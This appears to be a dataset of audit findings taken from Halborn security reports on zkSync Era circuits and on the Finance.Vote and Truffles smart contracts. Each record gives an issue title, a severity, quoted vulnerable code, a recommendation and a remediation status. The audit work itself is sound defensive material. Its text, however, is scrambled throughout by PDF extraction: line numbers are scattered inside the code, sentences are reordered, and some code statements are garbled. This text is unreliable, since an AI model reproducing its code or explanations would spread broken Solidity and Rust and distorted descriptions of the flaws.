149 150 151 152 153 ) -> Result <[ StorageLogQueue <E >; NUM_SEPARATE_QUEUES ], cs : & mut CS , mut storage_log_queue : StorageLogQueue <E >, round_function : &R , limit : usize ,  SynthesisError > { 154 155 156 assert! ( limit <= u32 :: MAX as usize ); let mut optimizer = SpongeOptimizer :: new ( round_function . clone  () , 3) ; 157 158 159 160 161 162 163 164 165 166 let mut rollup_storage_queue = StorageLogQueue :: empty () ; // let mut porter_storage_queue = StorageLogQueue :: empty () ; let mut events_queue = StorageLogQueue :: empty () ; let mut l1_messages_queue = StorageLogQueue :: empty () ; let mut keccak_calls_queue = StorageLogQueue :: empty () ; let mut sha256_calls_queue = StorageLogQueue :: empty () ; let mut ecdsa_calls_queue = StorageLogQueue :: empty () ; const SYSTEM_CONTRACTS_OFFSET_ADDRESS : u16 = 1 << 15; 22 167 168 const KECCAK256_ROUND_FUNCTION_PRECOMPILE_ADDRESS : u16 =  SYSTEM_CONTRACTS_OFFSET_ADDRESS + 0 x10 ; 169 const SHA256_ROUND_FUNCTION_PRECOMPILE_ADDRESS : u16 = 0 x02 ; //  as in Ethereum 170 const ECRECOVER_INNER_FUNCTION_PRECOMPILE_ADDRESS : u16 = 0 x01 ;  // as in Ethereum 171 172 let keccak_precompile_address = UInt160 :: from_uint ( u160 ::  from_u64 ( 173 174 175 KECCAK256_ROUND_FUNCTION_PRECOMPILE_ADDRESS as u64 , )); let sha256_precompile_address = UInt160 :: from_uint ( u160 ::  from_u64 ( 176 177 178 SHA256_ROUND_FUNCTION_PRECOMPILE_ADDRESS as u64 , )); let ecrecover_precompile_address = UInt160 :: from_uint ( u160 ::  from_u64 ( 179 180 181 182 183 184 185 186 ECRECOVER_INNER_FUNCTION_PRECOMPILE_ADDRESS as u64 , )); for _ in 0.. limit { let execute = storage_log_queue . is_empty ( cs ) ?. not () ; // let n = cs . get_current_step_number () ; let popped = storage_log_queue . pop_first ( cs , & execute ,  round_function ) ?; 187 188 189 190 // dbg! ( cs . get_current_step_number () - n ) ; // 291 let is_storage_aux_byte = Num :: equals (cs , & aux_byte_for_storage () . inner , & popped  . aux_byte . inner ) ?; 191 192 let is_event_aux_byte = Num :: equals (cs , & aux_byte_for_event () . inner , & popped .  aux_byte . inner ) ?; 193 194 let is_l1_message_aux_byte = Num :: equals (cs , & aux_byte_for_l1_message () . inner , &  popped . aux_byte . inner ) ?; 195 196 197 198 199 200 let is_precompile_aux_byte = Num :: equals ( cs , & aux_byte_for_precompile_call () . inner , & popped . aux_byte . inner , ) ?; 23 201 let is_keccak_address = UInt160 :: equals ( cs , &  keccak_precompile_address , & popped . address ) ?; 202 let is_sha256_address = UInt160 :: equals ( cs , &  sha256_precompile_address , & popped . address ) ?; let is_ecrecover_address = 203 204 UInt160 :: equals ( cs , & ecrecover_precompile_address , &  popped . address ) ?; 205 206 207 208 209 let is_rollup_shard = popped . shard_id . inner . is_zero ( cs ) ?; let execute_rollup_storage = smart_and ( cs , &[ is_storage_aux_byte , is_rollup_shard ,  execute ]) ?; 210 211 let execute_porter_storage = smart_and ( cs , &[ is_storage_aux_byte , is_rollup_shard .  not () , execute ]) ?; 212 Boolean :: enforce_equal ( cs , & execute_porter_storage , &  Boolean :: constant ( false )) ?; 213 let execute_event = smart_and (cs , &[ is_event_aux_byte ,  execute ]) ?; 214 let execute_l1_message = smart_and ( cs , &[  is_l1_message_aux_byte , execute ]) ?; 215 216 let execute_keccak_call = smart_and ( cs , &[ is_precompile_aux_byte ,  is_keccak_address , execute ]) ?; 217 218 let execute_sha256_call = smart_and ( cs , &[ is_precompile_aux_byte ,  is_sha256_address , execute ]) ?; 219 220 let execute_ecrecover_call = smart_and ( cs , &[ is_precompile_aux_byte ,  is_ecrecover_address , execute ]) ?; 221 222 223 224 225 226 227 228 229 230 // let n = cs . get_current_step_number () ; rollup_storage_queue . push_with_optimizer ( cs , LogType :: RollupStorage as u64 , & popped , & execute_rollup_storage , & mut optimizer , ) ?; // porter_storage_queue . push_with_optimizer (cs , LogType ::  PorterStorage as u64 , & popped , & execute_porter_storage , & mut  optimizer ) ?; 231 events_queue . push_with_optimizer ( 24 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 cs , LogType :: Events as u64 , & popped , & execute_event , & mut optimizer , ) ?; l1_messages_queue . push_with_optimizer ( cs , LogType :: L1Messages as u64 , & popped , & execute_l1_message , & mut optimizer , ) ?; keccak_calls_queue . push_with_optimizer ( cs , LogType :: KeccakCalls as u64 , & popped , & execute_keccak_call , & mut optimizer , ) ?; sha256_calls_queue . push_with_optimizer ( cs , LogType :: Sha256Calls as u64 , & popped , & execute_sha256_call , & mut optimizer , ) ?; ecdsa_calls_queue . push_with_optimizer ( cs , LogType :: ECRecoverCalls as u64 , & popped , & execute_ecrecover_call , & mut optimizer , ) ?; // dbg! ( cs . get_current_step_number () - n ) ; // 96 // let n = cs . get_current_step_number () ; optimizer . enforce ( cs ) ?; // dbg! ( cs . get_current_step_number () - n ) ; // 338 let expected_bitmask_bits = [ is_storage_aux_byte , is_event_aux_byte , is_l1_message_aux_byte , 25 276 277 278 279 280 is_precompile_aux_byte , ]; let ( is_bitmask , all_flags_are_false ) = check_if_bitmask_and_if_empty ( cs , &  expected_bitmask_bits ) ?; 281 can_not_be_false_if_flagged (cs , & is_bitmask , & Boolean ::  Constant ( true )) ?; 282 can_not_be_false_if_flagged (cs , & all_flags_are_false . not ()  , & execute ) ?; } 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 } storage_log_queue . enforce_to_be_empty ( cs ) ?; let all_queues = [ rollup_storage_queue , events_queue , l1_messages_queue , keccak_calls_queue , sha256_calls_queue , ecdsa_calls_queue , ]; Ok ( all_queues ) Risk Level: Likelihood - 1 Impact - 1 Recommendation: Any unused code is recommended to be removed for better readability of the overall code and optimization. 26 Remediation Plan: SOLVED: The MatterLabs team solved the issue by removing the unused function. Commit ID : 06c2e76546369fb112d8ac14fb5388154857435b 27 ", "labels": ["Halborn", "MatterLabs_zkSync_Era_Circuits_Zero_Knowledge", "Severity: Informational"]}, {"title": "QUEUE NOT ENFORCED TO BE EMPTY RIGHT AFTER POPPING ALL ELEMENTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/ZK Audits/MatterLabs_zkSync_Era_Circuits_Zero_Knowledge_Security_Audit_Report_Halborn_Final..pdf", "body": "The MERKLEIZER circuit (merkleize_l1_messages) does not enforce the ini- tial queue to be empty right after popping all elements. Even though it does it at the end of the circuit, as this circuit is resource-consuming while computing the linear hash and the Merkle tree hash, it would be useful to enforce it before all the hashing functionality for better readability of the overall code and optimization. Code Location: Listing 8: merkleize_l1_messages/merkleize.rs (Line 244) 204 for chunk in linear_hash_input [4..]. chunks_exact_mut (  MESSAGE_SERIALIZATION_BYTES ) { 205 206 let can_pop = initial_queue . is_empty ( cs ) ?. not () ; let item = initial_queue . pop_first ( cs , & can_pop ,  round_function ) ?; let serialized = item . serialize ( cs ) ?; assert_eq! ( chunk . len () , serialized . len () ); for ( dst , src ) in chunk . iter_mut () . zip ( serialized . iter () ) { * dst = Byte :: conditionally_select ( cs , & can_pop , src , dst ) 207 208 209 210  ?; } 211 212 } 213 214 let linear_hash = if output_linear_hash { 215 216 217 218 219 220 \" Computing linear hash over {} bytes \" , linear_hash_input . len () println! ( ); let pubdata_hash = tree_hasher . hash ( cs , & linear_hash_input ) ?; let pubdata_hash_as_bytes32 = Bytes32 :: from_bytes_array (&  pubdata_hash ); 221 28 pubdata_hash_as_bytes32 222 223 } else { 224 225 }; 226 227 // a little bit tricky : unsafe cast , but we checked the length , Bytes32 :: empty ()  and ABI wise it 's guaranteed 228 // later on we can use split_array_ref 229 230 let leafs_only_bytes = & linear_hash_input [4..]; 231 assert! ( leafs_only_bytes . len () % MESSAGE_SERIALIZATION_BYTES == 0)  ; 232 233 let mut leafs = vec! []; 234 for chunk in leafs_only_bytes . chunks_exact (  MESSAGE_SERIALIZATION_BYTES ) { 235 let leaf_encoding : [ _ ; MESSAGE_SERIALIZATION_BYTES ] = chunk .  to_vec () . try_into () . unwrap () ; leafs . push ( leaf_encoding ); 236 237 } 238 239 println! ( \" Computing tree over {} leafs \" , leafs . len () ); 240 241 let calculated_merkle_root = 242 circuit_compute_merkle_root_from_leafs_generic :: <_ , _ , H ,  ARITY >( cs , & leafs , tree_hasher ) ?; 243 244 initial_queue . enforce_to_be_empty ( cs ) ?; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Enforce the initial queue to be empty right after popping all elements for better readability of the overall code and optimization. 29 Remediation Plan: ACKNOWLEDGED: The MatterLabs team acknowledged this issue. It will be addressed while moving to the new proof system. 30 ", "labels": ["Halborn", "MatterLabs_zkSync_Era_Circuits_Zero_Knowledge", "Severity: Informational"]}, {"title": "UNNEEDED INITIALIZATION OF UINT256 VARIABLES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/ZK Audits/MatterLabs_zkSync_Era_Circuits_Zero_Knowledge_Security_Audit_Report_Halborn_Final..pdf", "body": "As i is an uint256, it is already initialized to 0. reassigns the 0 to i which wastes gas. uint256 i = 0 Code Location: 134: for (uint256 i = 0; i < public_inputs.length; i = i. Verifier.sol Line - uncheckedInc()){ - Line 139: for (uint256 i = 0; i < STATE_WIDTH; i = i.uncheckedInc()){ - Line 164: for (uint256 i = 0; i < proof.quotient_poly_parts_commitments .length; i = i.uncheckedInc()){ - Line 172: length; i = i.uncheckedInc()){ - Line 178: for (uint256 i = 0; i < proof.state_polys_openings_at_z_omega .length; i = i.uncheckedInc()){ - Line 183: for (uint256 i = 0; i < proof.gate_selectors_openings_at_z. length; i = i.uncheckedInc()){ - Line 188: for (uint256 i = 0; i < proof.copy_permutation_polys_openings_at_z .length; i = i.uncheckedInc()){ for (uint256 i = 0; i < proof.state_polys_openings_at_z. Plonk4VerifierWithAccessToDNext.sol - Line 144: for (uint256 i = 0; i < vk.num_inputs; i = i.uncheckedInc() ){ - Line 148: for (uint256 i = 0; i < STATE_WIDTH; i = i.uncheckedInc()){ - Line 164: for (uint256 i = 0; i < proof.quotient_poly_parts_commitments .length; i = i.uncheckedInc()){ - Line 171: length; i = i.uncheckedInc()){ - Line 175: for (uint256 i = 0; i < proof.state_polys_openings_at_z_omega for (uint256 i = 0; i < proof.state_polys_openings_at_z. 31 .length; i = i.uncheckedInc()){ - Line 178: for (uint256 i = 0; i < proof.gate_selectors_openings_at_z. length; i = i.uncheckedInc()){ - Line 181: for (uint256 i = 0; i < proof.copy_permutation_polys_openings_at_z .length; i = i.uncheckedInc()){ - Line 301: for (uint256 i = 0; i < lagrange_poly_numbers.length; i = i .uncheckedInc()){ - Line 307: for (uint256 i = 0; i < vk.num_inputs; i = i.uncheckedInc() ){ - Line 324: for (uint256 i = 0; i < proof.copy_permutation_polys_openings_at_z .length; i = i.uncheckedInc()){ - Line 448: length; ){ - Line 472: for (uint256 i = 0; i < STATE_WIDTH - 1; i = i.uncheckedInc ()){ - Line 558: for (uint256 i = 0; i < STATE_WIDTH - 1; i = i.uncheckedInc ()){ - Line 613: for (uint256 i = 0; i < STATE_WIDTH; i = i.uncheckedInc()){ - Line 622: for (uint256 i = 0; i < STATE_WIDTH - 1; i = i.uncheckedInc ()){ for (uint256 i = 0; i < proof.state_polys_openings_at_z. PairingsBn254.sol - Line 240: for (uint256 i = 0; i < elements; ){ Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended not to initialize uint256 variables to 0 to reduce the gas costs. For example, use instead: for (uint256 i; i < length; ++i){ 32 Remediation Plan: ACKNOWLEDGED: The MatterLabs team acknowledged this issue. 33 ", "labels": ["Halborn", "MatterLabs_zkSync_Era_Circuits_Zero_Knowledge", "Severity: Informational"]}, {"title": "MISSING ADDRESS VALIDATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract_Security_Audit_Halborn_v1_1.pdf", "body": "The GatedMerkleIdentity.sol and Incinerator.sol contracts lack a safety check inside their constructors and functions. Setters of address type Otherwise, contract parameters should include a zero-address check. functionality may become inaccessible, or tokens could be burnt forever. Code Location: GatedMerkleIdentity.sol Line #~45 Listing 1: GatedMerkleIdentity.sol (Lines ) 45 46 47 48 49 function setGateParameters ( address _incinerator , address _burnToken , uint _ethCost ) public managementOnly { incinerator = IIncinerator ( _incinerator ); burnToken = _burnToken ; ethCost = _ethCost ; } GatedMerkleIdentity.sol Line #~52 Listing 2: GatedMerkleIdentity.sol (Lines ) // change the management key function setManagement ( address newMgmt ) external managementOnly { address oldMgmt = management = newMgmt ; emit ManagementUpdated ( oldMgmt , newMgmt ); management ; } 52 53 54 55 56 57 58 Incinerator.sol Line #~36 13 Listing 3: Incinerator.sol (Lines ) 36 37 38 39 40 function setManagement ( address newMgmt ) external managementOnly { address oldMgmt = management = newMgmt ; emit ManagementUpdated ( oldMgmt , newMgmt ); management ; } Risk Level: Likelihood - 2 Impact - 2 Recommendation: Add proper address validation when assigning a value to a variable from user-supplied data. Better yet, address white-listing/black-listing should be implemented in relevant functions if possible. For example: Listing 4: Modifier.sol (Lines 2,3,4) 1 2 3 4 5 modifier validAddress ( address addr ) { require ( addr != address (0) , \" Address cannot be 0 x0 \"); require ( addr != address ( this ) , \" Address cannot be contract \" ); _; } Remediation Plan: RISK ACCEPTED: Finance.Vote Team decided to continue without address validation. 14 ", "labels": ["Halborn", "Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract", "Severity: Low"]}, {"title": "MISSING EVENT HANDLER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract_Security_Audit_Halborn_v1_1.pdf", "body": "In the GatedMerkleIdentity.sol contract, some functions do not emit logging events. Events are a method of informing the transaction initiator about the actions taken by the called function. Logs are used for event subscriptions and are indexed. It is not possible to search for a specific event unless the contract logs it. Code Location: GatedMerkleIdentity.sol Line #~45 Listing 5: GatedMerkleIdentity.sol (Lines ) 45 46 47 48 function setGateParameters ( address _incinerator , address _burnToken , uint _ethCost ) public managementOnly { burnToken = _burnToken ; ethCost = _ethCost ; } Risk Level: Likelihood - 2 Impact - 2 Recommendation: Where appropriate, declare events at the end of the function. Clients can use events to detect the end of the operation and aid in searching for the specific activity. For example: 15 Listing 6: GatedMerkleIdentity.sol (Lines ) 1 2 3 4 5 function setGateParameters ( address _incinerator , address _burnToken , uint _ethCost ) public managementOnly { burnToken = _burnToken ; ethCost = _ethCost ; emit SetGateEvent ( burnToken , ethCost ); } Remediation Plan: RISK ACCEPTED: Finance.Vote Team decided to continue without event emitting. 16 ", "labels": ["Halborn", "Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract", "Severity: Low"]}, {"title": "IGNORED RETURN VALUES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract_Security_Audit_Halborn_v1_1.pdf", "body": "The return value of an external call is not stored in a local or state variable. In the contract Incinerator.sol, there are a few instances where external methods are called and the return value (bool) is ignored. Code Location: GatedMerkleIdentity.sol Line #~63 Listing 7: GatedMerkleIdentity.sol (Lines 69) function withdraw ( uint merkleIndex , bytes32 [] memory proof ) external payable { require ( msg . value >= ethCost , ' Please send more ETH '); require ( verifyEntitled ( merkleRoots [ merkleIndex ], msg . sender , proof ) , \" The proof could not be verified . \" ); // burn token cost if ( msg . value > 0) { incinerator . incinerate { value : msg . value }( burnToken ); } // note that this effectively prevents inclusion of the same address in multiple merkle roots require (! withdrawn [ msg . sender ], \" You have already withdrawn your nft . \"); withdrawn [ msg . sender ] = true ; token . createIdentityFor ( msg . sender ); } 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 Incinerator.sol Line #~43 17 Listing 8: Incinerator.sol (Lines ) // buy tokens at market rate and burn them function incinerate ( address tokenAddr ) external payable { uint amountOutMin = 0; address [] memory path = new address [](2) ; path [0] = WETH ; path [1] = tokenAddr ; address burnAddress = address (0) ; uint deadline = block . timestamp + 1; uint [] memory amounts = router . swapExactETHForTokens { value : msg . value }( amountOutMin , path , burnAddress , deadline ) ; emit TokensIncinerated ( tokenAddr , amounts [1]) ; } 43 44 45 46 47 48 49 50 51 52 53 54 55 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Add a return value check to avoid an unexpected crash of the contract. Return value checks provide better exception handling. Remediation Plan: RISK ACCEPTED: Finance.Vote Team decided to continue without checking return values. 18 ", "labels": ["Halborn", "Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract", "Severity: Low"]}, {"title": "MULTIPLE INCINERATE ON THE WITHDRAW PROGRESS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract_Security_Audit_Halborn_v1_1.pdf", "body": "In the GatedMerkleIdentity.sol contract, a user can only withdraw However, repeated when providing the correct merkleIndex and proof. incinerate calls can occur if the user attempts multiple withdrawals because incinerate is called before checking for a previous withdraw. Code Location: GatedMerkleIdentity.sol Line #~63 Listing 9: GatedMerkleIdentity.sol (Lines 69) 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 function withdraw ( uint merkleIndex , bytes32 [] memory proof ) external payable { require ( msg . value >= ethCost , ' Please send more ETH '); require ( verifyEntitled ( merkleRoots [ merkleIndex ], msg . sender , proof ) , \" The proof could not be verified . \" ); // burn token cost if ( msg . value > 0) { incinerator . incinerate { value : msg . value }( burnToken ); } // note that this effectively prevents inclusion of the same address in multiple merkle roots require (! withdrawn [ msg . sender ], \" You have already withdrawn your nft . \"); withdrawn [ msg . sender ] = true ; token . createIdentityFor ( msg . sender ); } 19 Risk Level: Likelihood - 1 Impact - 1 Recommendation: The workflow should be checked according to the incinerator progress. As an solution, require(! withdrawn[msg.sender] line should move to the top of the function. Listing 10: GatedMerkleIdentity.sol (Lines 69) 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 function withdraw ( uint merkleIndex , bytes32 [] memory proof ) external payable { require ( msg . value >= ethCost , ' Please send more ETH '); require ( verifyEntitled ( merkleRoots [ merkleIndex ], msg . sender , proof ) , \" The proof could not be verified . \" ); require (! withdrawn [ msg . sender ], \" You have already withdrawn your nft . \"); // burn token cost if ( msg . value > 0) { incinerator . incinerate { value : msg . value }( burnToken ); } // note that this effectively prevents inclusion of the same address in multiple merkle roots withdrawn [ msg . sender ] = true ; token . createIdentityFor ( msg . sender ); } Remediation Plan: SOLVED: Finance.Vote Team changed the location of modifier. 20 Listing 11: GatedMerkleIdentity.sol (Lines 67) 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 function withdraw ( uint merkleIndex , bytes32 [] memory proof ) external payable { require ( msg . value >= ethCost , ' Please send more ETH '); require ( verifyEntitled ( merkleRoots [ merkleIndex ], msg . sender , proof ) , \" The proof could not be verified . \" ); // note that this effectively prevents inclusion of the same address in multiple merkle roots require (! withdrawn [ msg . sender ], \" You have already withdrawn your nft . \"); withdrawn [ msg . sender ] = true ; // burn token cost if ( msg . value > 0) { incinerator . incinerate { value : msg . value }( burnToken ); } token . createIdentityFor ( msg . sender ); } 21 ", "labels": ["Halborn", "Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract", "Severity: Informational"]}, {"title": "MISSING ARRAY ELEMENT CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract_Security_Audit_Halborn_v1_1.pdf", "body": "The verifyProof function in the GatedMerkleIdentity.sol contract discards the first bytes32 element in the user-provided proof array. Code Location: GatedMerkleIdentity.sol Line #~45 Listing 12: GatedMerkleIdentity.sol (Lines 99) 96 function verifyProof ( bytes32 root , bytes32 leaf , bytes32 [] 97 98 99 100 101 102 103 104 memory proof ) public pure returns ( bool ) { bytes32 currentHash = leaf ; for ( uint i = 1; i < proof . length ; i += 1) { currentHash = parentHash ( currentHash , proof [ i ]) ; } return currentHash == root ; } Example Inputs Listing 13 1 function withdraw ( uint merkleIndex , bytes32 [] memory proof ) 2 merkleIndex : 3 - 0 xd778161eb220a7790fc703d428fb65c50de8c9fa37ea6a5cd8ae6d1513ee7a3f 3 proof : [ \"0 x0000000000000000000000000000000000000000000000000000000000000000 \" ,\"0 x0d015084d5b21f5040c727e73691438a3d401c651c8c4f5d0f6dc480f57ece5c \" ] 22 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to check the proof arrays first element. However, if this is the intended behavior of the function, the first element should not be considered in the proof calculation. Remediation Plan: SOLVED: Finance.Vote Team checked proof arrays first element. Listing 14: GatedMerkleIdentity.sol (Lines 99) 96 function verifyProof ( bytes32 root , bytes32 leaf , bytes32 [] memory proof ) public pure returns ( bool ) { bytes32 currentHash = leaf ; for ( uint i = 0; i < proof . length ; i += 1) { currentHash = parentHash ( currentHash , proof [ i ]) ; } return currentHash == root ; } 97 98 99 100 101 102 103 104 105 23 ", "labels": ["Halborn", "Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract", "Severity: Informational"]}, {"title": "FOR LOOP OVER DYNAMIC ARRAY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract_Security_Audit_Halborn_v1_1.pdf", "body": "When smart contracts are deployed or functions inside them are called, the execution of these actions always requires a certain amount of gas, based on how much computation is needed to complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block cannot exceed the threshold. Programming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. Modifying an array of unknown size, that increases in size over time, can lead to such a Denial of Service condition. A situation in which the block gas limit can be an issue is in sending funds to an array of addresses. Even without any malicious intent, this can easily go wrong. Just by having too large an array of users to pay can max out the gas limit and prevent the transaction from ever succeeding. Example Location: Listing 15: GatedMerkleIdentity.sol (Lines 99) 96 function verifyProof ( bytes32 root , bytes32 leaf , bytes32 [] 97 98 99 100 101 102 103 104 memory proof ) public pure returns ( bool ) { bytes32 currentHash = leaf ; for ( uint i = 1; i < proof . length ; i += 1) { currentHash = parentHash ( currentHash , proof [ i ]) ; } return currentHash == root ; } 24 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Actions that require looping across the entire data structure should be avoided. If you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions. As an other solution, the function should be marked as an internal. Remediation Plan: RISK ACCEPTED: Finance.Vote Team decided to continue without checking proof array size. 25 ", "labels": ["Halborn", "Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract_Security_Audit_Halborn_v1_1.pdf", "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: Listing 16: GatedMerkleIdentity.sol (Lines ) 96 function verifyProof ( bytes32 root , bytes32 leaf , bytes32 [] 97 98 99 100 101 102 103 104 memory proof ) public pure returns ( bool ) { bytes32 currentHash = leaf ; for ( uint i = 1; i < proof . length ; i += 1) { currentHash = parentHash ( currentHash , proof [ i ]) ; } return currentHash == root ; } Risk Level: Likelihood - 1 Impact - 1 26 Recommendation: Consider declaring external variables instead of public variables. A best practice is to use external if expecting a function to only be called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. Remediation Plan: SOLVED: Finance.Vote Team provided the function is called internally and externally. 27 MANUAL TESTING 28 During the manual testing multiple questions where considered while evaluation each of the defined functions:  Can it be re-called changing admin/roles and permissions?  Can an externally controlled contract recursively call functions during execution? (Re-entrancy)  Do we control sensitive or vulnerable parameters?  Does the function check for boundaries on the parameters and internal values? Bigger than zero or equal? Argument count, array sizes, integer truncation.  Are there any hash collisions in the merkle proof calculation?  Can an attacker withdraw multiple times? 4.1 Access Control Test During First, all contracts access-control policies were evaluated. the tests, the following functions were reachable only by the management address. Listing 17 1 function setGateParameters ( address _incinerator , address _burnToken , uint _ethCost ) 2 function setManagement ( address newMgmt ) 3 function addMerkleRoot ( bytes32 newRoot ) According to policies, No issues have been found on the dynamic analysis. Figure 1 29 G N I T S E T L A U N A M Figure 1: Testing Access Control Policy 4.2 Merkle Tree Test Next, the Merkle Proof functionality was examined. In the merkle proof verification, Msg.sender was used for a leaf on the tree. Figure 2 It has been observed that, the proof arrays first element was not included in the hash calculation. Therefore, It is marked as an informational issue in the report. (HAL04 - MISSING ARRAY ELEMENT CHECK) Listing 18: GatedMerkleIdentity.sol (Lines 99) 96 function verifyProof ( bytes32 root , bytes32 leaf , bytes32 [] 97 98 99 100 101 102 103 104 memory proof ) public pure returns ( bool ) { bytes32 currentHash = leaf ; for ( uint i = 1; i < proof . length ; i += 1) { currentHash = parentHash ( currentHash , proof [ i ]) ; } return currentHash == root ; } 30 G N I T S E T L A U N A M Figure 2: Testing Merkle Proof 4.3 Multiple Withdraw Test The Halborn Team tried to Then the withdraw progress was tested. Figure 3 From the test results, It was manipulate withdraw progress. observed that the user could not create an identity multiple times. On the other hand, the user could incinerate multiple times due to check statements being completed after an incinerator call. G N I T S E T L A U N A M 31 Figure 3: Testing Multiple Withdraws G N I T S E T L A U N A M 32 ", "labels": ["Halborn", "Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract", "Severity: Informational"]}, {"title": "LACK OF THE TWO STEP OWNERSHIP TRANSFER PATTERN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Truffles_NFT_Invoice_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The Authorizable contract is inherited by the Truffles contract and implements the Ownable pattern. However, the assessment revealed that the solution does not support the two-step-ownership-transfer pattern. The ownership transfer might be accidentally set to an inactive EOA account. In the case of account hijacking, all functionalities get under permanent control of the attacker. Code Location: Listing 1: contracts/Authorizable.sol 8 contract Authorizable is Ownable { 9 10 mapping ( address => bool ) private authorized ; 11 modifier onlyAuthorized () { 12  authorized \" ); 13 14 } require ( authorized [ msg . sender ] || _ ; owner () == msg . sender , \" Not Listing 2: contracts/Truffles.sol 34 contract TRUFFLES is ERC721 , ERC721Enumerable , ERC721URIStorage ,  Authorizable { BVSS: AO:S/AC:L/AX:L/C:N/I:H/A:H/D:M/Y:M/R:N/S:C (3.0) 19 Recommendation: It is recommended to implement a two-step process where the owner nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of the ownership to fully succeed. This ensures the nominated EOA account is a valid and active account. Remediation Plan: SOLVED: The Truffles team solved this finding in commit fc36014: the Ownable contract was replaced with the Ownable2Step.sol from the Open- Zeppelin library within the Authorizable contract to establish a secure approach for conducting two-step ownership transfers. 20 ", "labels": ["Halborn", "Truffles_NFT_Invoice", "Severity: Low"]}, {"title": "MISSING ZERO ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Truffles_NFT_Invoice_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "do not addEligibleHolder, and functions The isEligibleHolder no addresses provided as parameters are the zero addresses. Consequently, there is a risk of accidentally setting an eligible holder address to the zero address, leading to unintended behavior or potential vulnerabilities in the future. removeEligibleHolder verification perform ensure that to Code Location: Listing 3: contracts/Truffles.sol (Lines 103,110) s_eligibleHolders [ _org ] = true ; 102 function addEligibleHolder ( address _org ) public onlyAuthorized { 103 104 } 105 106 // / @notice remove eligible holders for NFT 107 // / @dev remove eligible address to eligibleHolders maping :  onlyAuthorized 108 // / @param _org address of already eligible holder 109 function removeEligibleHolder ( address _org ) public onlyAuthorized  { 110 111 } s_eligibleHolders [ _org ] = false ; Listing 4: contracts/Truffles.sol (Line 197) public view returns ( bool _isEligibleHolder ) 192 function isEligibleHolder ( address _holder ) 193 194 195 196 { 197 198 } return ( s_eligibleHolders [ _holder ]) ; 21 BVSS: AO:S/AC:L/AX:L/C:N/I:C/A:N/D:N/Y:N/R:N/S:U (2.0) Recommendation: Consider adding a check to ensure that the provided address is not the zero address before modifying or checking holders eligibility. It is also possible to add a modifier that performs the verification and then apply it to the above functions instead, to avoid repeating the zero address check in each function. Remediation Plan: SOLVED: The Truffles team solved this finding in commit fc36014: the func- tion addEligibleHolder was updated with a validation step to ensure that the provided address is not the zero address before making modifications to the headlineholders eligibility. Similarly, the removeEligibleHolder function now includes a validation check to confirm that the given address corresponds to an existing holder. 22 ", "labels": ["Halborn", "Truffles_NFT_Invoice", "Severity: Low"]}, {"title": "INVOICE TYPE CHECK MISSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Truffles_NFT_Invoice_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The settlePrivateInvoice function allows authorized addresses to mark the corresponding NFT of a private invoice as settled when the full However, it lacks a check to verify amount of the invoice is paid. Consequently, that the provided NFT is of the private invoice type. both private and public invoices could be settled indifferently. If the provided NFT ID corresponds to a public invoice, it is added to the s_isPrivateInvoicePaid mapping, even though its type does not match, leading to data inconsistency. In addition, private invoices do not store the amount for the NFT unlike public ones, so the function also does not have a proper check to verify that the full amount of the invoice is 